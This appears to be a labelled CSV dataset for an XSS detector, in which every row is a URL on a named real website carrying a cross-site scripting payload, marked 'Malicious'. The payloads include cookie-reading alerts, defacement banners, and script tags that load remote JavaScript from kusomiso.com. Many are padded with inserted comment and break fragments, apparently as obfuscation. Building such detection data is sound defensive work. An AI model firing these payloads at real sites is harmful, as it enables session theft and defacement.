Payloads,Class
http://www.xrea.com/?action=signup1&amp;server=%22%3e'%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22kusomiso.com%22`%3c<!--Comment-->/script<br>%3e%3c<!--Comment-->/script<br>%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e,Malicious
http://www.idg.com/www/idgdir.nsf/contactsearch?openagent&amp;type=productline&amp;value=%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`1<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>23`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.uadm.uu.se/upi/mediaservice/mrbs-1.2.3/day.php?area=%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`123`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://town.new-windsor.ny.us/gallery/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.stanford.edu/group/spatialhistory/cgi-bin/site/search.php;msg_esito=%3e%22%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br>3ealert`document.cookie`%3c<!--Comment-->/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`document.cookie`%3c/script%3e,Malicious
http://tiris.tirol.gv.at/scripts/esrimap.dll?name=adress&amp;gemnr=701&amp;hausadr=%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`123`%3c<br>/script<!--Comment-->%3e%3c<br>/script<!--Comment-->%3e%3c<br<!--Comment-->>/script%3e%3c<br<!--Comment-->>/script%3e&amp;hausnr=&amp;gebnam=&amp;anzadrt.x=0&amp;anzadrt.x=0&amp;anzadrt.y=0&amp;anzadrt=anzadrt&amp;myaufl=1024,Malicious
http://my.giovani.it/all/sfide.php?id_sfida=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2fxss+by+redtuning%2f%29%3b%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>c%2fscript%3e,Malicious
http://www.wordreference.com/es/translation.asp?tranword=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27ciao%27%29%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c%2fscri<br<!--Comment-->>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%3c<!--Comment-->%2fscri<br>pt%3e%0d%0a&amp;b10=cerca&amp;dict=enes,Malicious
http://extrafreeweb.info/index.php?=&amp;=%27%22%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%3a%2f%2fxssed.com<!--Comment-->%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%3a%2f%2fxssed.com%3e,Malicious
http://arab-shopping.com/article/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`doc<br<!--Comment-->><br<!--Comment-->>ument.cookie`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3eby%20st@rext%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e,Malicious
http://w.n-w.jp/pc/common_hl_detail.php?more_flg=&amp;a=c%00%22%22%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`123456789`;%3c/scrip<br>t<!--Comment-->%3e%3c/scrip<br>t<!--Comment-->%3e%3c/scrip<br>t<!--Comment-->%3e%3c/scrip<br>t<!--Comment-->%3e&amp;no=486,Malicious
http://www.photoobjects.net/en/search/index?srch=search&amp;big=1&amp;k_var=%27%3e%22%3e%3cscript%2fsrc%3dht<br<!--Comment-->>tp%3a%2f%2fkusomiso.com%2fx.js%3e%3cscript%2fsrc%3dht<br<!--Comment-->>tp%3a%2f%2fkusomiso.com%2fx.js%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e&amp;x=0&amp;y=0,Malicious
http://group.hugoboss.com/newsletter/index.php?l=de&amp;req=deregistration&amp;news=news&amp;email=+}%3c%2fstyle<br><!--Comment-->%3e%3c%2fstyle<br><!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ea%3deval%3bb%3dalert%3ba`b`%2fxss%2f.source``%3b%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3cmarquee+bgcolor%3d%<br<!--Comment-->>22red%22%3e%3cmarquee+bgcolor%3d%<br<!--Comment-->>22red%22%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss+by+xylitol%3c<!--Comment-->%2fh1%3e%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->%2fmarquee%3e%3c%2fmarquee<!--Comment-->%3e+}%3c<!--Comment-->%2fstyle%3e%3c<!--Comment-->%2fstyle%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ea%3deval%3bb<br<!--Comment-->><br<!--Comment-->>%3dalert%3ba`b`%2fxss%2f.source``%3b%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->marquee+bgcolor%3d%22red%22%3e%3c<!--Comment-->marquee+bgcolor%3d%22red%22%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3exss+by+x<br<!--Comment-->><br<!--Comment-->>ylitol%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->%2fmarquee%3e%3c<!--Comment-->%2fmarquee%3e&amp;submit=abmelden,Malicious
http://www.foodsafety.gov/cgi-bin/fsg?query=%22%27%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3ecueballr%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->%2fm<br>arquee%3e%3c%2fm<br<!--Comment-->>arquee%3e&amp;stype=or,Malicious
http://www.questback.com/search-page/?q=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`document.cookie`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.comunas.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`/xss/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.eppendorfer-heimatverein.de/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;mar<br>quee<!--Comment-->&gt;&lt;mar<br<!--Comment-->>quee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://svn.openkomodo.com/openkomodo/view/openkomodo/trunk/readme.txt%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3cscript%<br<!--Comment-->>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3c<!--Comment-->script%<br>3ealert`1337`%3c/script%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
http://www.renaissanceva.com/eventgallery/login.asp?folder=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;<br<!--Comment-->><br<!--Comment-->>&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.neobee.net/ccontent/sales?phpsessid=da471faac6ecc8d7f93635da98f91519%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3eale<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>rt%28document.cookie%29;%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.darlingtontown.co.uk/directory/search.php?searchphrase=&lt;<!--Comment-->%2ftextarea&gt;&lt;<!--Comment-->%2ftextarea&gt;'&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`docu<br<!--Comment-->><br<!--Comment-->>ment.cookie`&lt;%2fscript<!--Comment-->&gt;&lt;%2fscript<!--Comment-->&gt;&amp;action=search&amp;submit=search+again+&gt;&gt;,Malicious
http://www.paperon.net/index.php?setdate=200710%22%3e%27%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>39%2c%31%31%31%2c%31%30%39%29%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.alfa-matrix.com/shop_comments.php?id=1524_0_8_0_c&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script<br>&gt;&lt;<!--Comment-->/script<br>&gt;&lt;<!--Comment-->/script<br>&gt;&lt;<!--Comment-->/script<br>&gt;,Malicious
http://tv1.rtp.pt/noticias/?headline=41&visual=10&text_page=1&search=%3e%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss%22`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.humankinetics.com/events/events.cfm?criteria=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;m<br<!--Comment-->>arquee&gt;&lt;m<br<!--Comment-->>arquee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://ezbs.net/admin/login.php?id=%27%3e%22%3e%3c<!--Comment-->script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c<!--Comment-->script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e<br<!--Comment-->><br<!--Comment-->>%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e&amp;submit=%91%97%90m,Malicious
http://nemadanema.rs/prod8141&amp;t=m%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28document.cookie%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://autoparts.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`document.cook<br<!--Comment-->><br<!--Comment-->>ie`;%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.gazeteodtulu.com/yazilar.php?id=3e%22%3e%3cscript%20%0a%0d<!--Comment-->%3e%3cscript%20%0a%0d<!--Comment-->%3e%3c<!--Comment-->script%20%0a%0d%3e%3c<!--Comment-->script%20%0a%0d%3ealert`document.cookie`%3b%3c<br>/script<!--Comment-->%3e%3c<br>/script<!--Comment-->%3e%3c<br<!--Comment-->>/script%3e%3c<br<!--Comment-->>/script%3e,Malicious
http://www.sewp.nasa.gov/index.shtml%3c/title<!--Comment-->%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22xss%22`;%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,Malicious
